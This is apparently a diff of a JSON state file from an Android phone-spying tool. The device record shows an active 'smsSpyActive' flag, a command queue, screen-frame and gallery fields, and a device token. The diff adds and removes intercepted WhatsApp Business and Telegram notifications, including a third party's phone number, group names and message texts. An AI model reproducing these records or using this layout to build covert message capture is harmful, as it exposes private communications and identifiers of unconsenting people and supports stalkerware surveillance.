@@ -303,7 +303,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775639221143,
+    "lastSeen": 1775639224234,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -319,6 +319,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "+62 856-4046-8707",
+        "content": "Serius?",
+        "time": "08/04 16:07",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775639226334
+      },
+      {
+        "appName": "WA Business",
+        "sender": "JB || KHAFA X NAZRIEL",
+        "content": "‎7 pesan baru",
+        "time": "08/04 16:07",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775639223999
+      },
       {
         "appName": "WA Business",
         "sender": "‎JB || KHAFA X NAZRIEL (7 pesan): ~ HAMSKY STORE REAL",
@@ -4302,22 +4318,6 @@
         "time": "08/04 15:17",
         "pkg": "org.telegram.messenger.web",
         "receivedAt": 1775636262429
-      },
-      {
-        "appName": "Telegram",
-        "sender": "ALL BUYYER GOJO HARIAN: 𝗩𝗮𝗻𝘇𝘇𝗼_𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹",
-        "content": "Send id tele lu",
-        "time": "08/04 15:17",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775636262416
-      },
-      {
-        "appName": "Telegram",
-        "sender": "TEAM ZANXRES: You",
-        "content": "T̴̕ ̐͒ T̴̕ ̐͒ joined to the group TEAM ZANXRES via invite link",
-        "time": "08/04 15:17",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775636262382
       }
     ],
     "galleryPhotos": [],
